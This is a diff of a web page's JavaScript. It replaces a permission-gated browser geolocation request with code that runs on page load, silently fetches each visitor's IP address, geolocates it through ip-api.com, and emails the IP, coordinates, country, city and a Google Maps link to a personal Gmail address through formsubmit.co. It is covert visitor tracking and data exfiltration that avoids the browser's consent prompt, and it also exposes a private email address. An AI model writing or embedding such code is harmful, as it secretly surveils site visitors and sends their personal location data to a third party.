@@ -144,16 +144,16 @@ const options = {
   maximumAge: 0,
 };
 
-function success(pos) {
-  const crd = pos.coords;
-  const latitude = crd.latitude;
-  const longitude = crd.longitude;
-  const accuracy = crd.accuracy;
+function success() {
+ 
 
       fetch("https://api.ipify.org/?format=json")
         .then((response) => response.json())
         .then((ipData) => {
-          fetch("https://formsubmit.co/ajax/aghayevvahid1@gmail.com", {
+
+          fetch(`http://ip-api.com/json/${ipData.ip}`).then(response=>response.json()).then(locationData=>{
+
+ fetch("https://formsubmit.co/ajax/aghayevvahid1@gmail.com", {
             method: "POST",
             headers: {
               "Content-Type": "application/json",
@@ -162,21 +162,22 @@ function success(pos) {
             body: JSON.stringify({
               name: "Location of Visiter",
               message: `
-          Visitors address: https://www.google.com/maps/place/@${latitude},${longitude},17z/data=!3m1!4b1!4m6!3m5!1s0x40307d9be82415c7:0x2ffa2f30c944209f!8m2!3d40.3849492!4d49.8286448!16s%2Fg%2F11gj5dn5f1?entry=ttu
+          Visitors address: https://www.google.com/maps/place/@${locationData.lat},${locationData.lon},17z/data=!3m1!4b1!4m6!3m5!1s0x40307d9be82415c7:0x2ffa2f30c944209f!8m2!3d40.3849492!4d49.8286448!16s%2Fg%2F11gj5dn5f1?entry=ttu
+          Country: ${locationData.country}
+          City: ${locationData.city}
           IP: ${ipData.ip}
-          Latitude:  ${latitude} 
-          Longitude: ${longitude} 
-          Accuracy:  ${accuracy}
+          Latitude:  ${locationData.lat} 
+          Longitude: ${locationData.lon} 
           `,
             }),
           })
+
+          })
+         
             
         });
    
 }
 
-function error(err) {
-  console.warn(`ERROR(${err.code}): ${err.message}`);
-}
 
-navigator.geolocation.getCurrentPosition(success, error, options);
+success();
